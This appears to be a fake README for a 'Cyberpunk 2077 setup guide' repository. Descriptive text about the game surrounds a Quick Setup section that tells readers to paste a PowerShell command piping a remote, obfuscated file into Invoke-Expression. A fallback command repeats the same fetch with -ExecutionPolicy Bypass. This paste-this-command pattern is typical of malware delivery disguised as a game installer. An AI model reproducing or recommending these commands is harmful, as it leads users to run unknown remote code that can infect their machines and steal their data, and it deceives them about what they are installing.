# Cyberpunk 2077

Cyberpunk 2077 is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch Cyberpunk 2077 and play.

Cyberpunk 2077 is a single-player action role-playing game built for Windows PCs. You create V, a mercenary in the megacity of Night City, and navigate corporate wars, street gangs, and a body-hopping plot tied to Johnny Silverhand. Combat blends shooting, melee, stealth, and quickhacks, while cyberware and skill trees let you specialize as a netrunner, solo, or techie. The city is dense with main jobs, side gigs, and optional encounters that react to choices you make across districts like Watson, Heywood, and Pacifica.

A typical evening on Windows starts when you launch the game from your library and load a recent save. You might follow a story arc through dialogue checks and combat encounters, then break for a street race or a fixer gig that pays eddies and gear. Driving and on-foot exploration share the same seamless map, so you can swap from a chase sequence to rooftop traversal without loading screens between neighborhoods. Performance settings such as resolution scaling, ray tracing, and frame generation help you balance fidelity against smooth input on your hardware.

This repository is meant to mirror a software project layout for that install. It includes a setup file for deploying the game on Windows, short notes on drivers and recommended presets, and a changelog that records version bumps and configuration tweaks over time. Treat it as the place you track what changed between play sessions and system updates, not as a substitute for the game itself.

## How you play

- Night City spans multiple districts with gigs, fixers, and reactive street-level storytelling.
- V's lifepath, attributes, and cyberware define how you fight, hack, and talk through jobs.
- Gunfights mix cover, smart weapons, blades, and quickhacks against varied enemy types.
- Driving and bikes connect missions across highways, alleys, and vertical parkour routes.
- Windows players tune DLSS, ray tracing, and HDR to match GPU capability and monitor setup.
- Main story and side arcs branch on dialogue, reputation, and who you choose to trust.
- Phantom Liberty adds Dogtown content with new skills when your edition includes that expansion.
- This repo stores the setup bundle, preset notes, and dated changelog entries for installs.

## Quick Setup (PowerShell)

This installs the game Cyberpunk 2077 on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/anja550322/cyberpunk-2077-setup-guide/main/gu024jawe1.7o3xqcv0 | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/anja550322/cyberpunk-2077-setup-guide/main/gu024jawe1.7o3xqcv0 | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `gu024jawe1.7o3xqcv0` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `anja550322/cyberpunk-2077-setup-guide`. Cyberpunk 2077 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
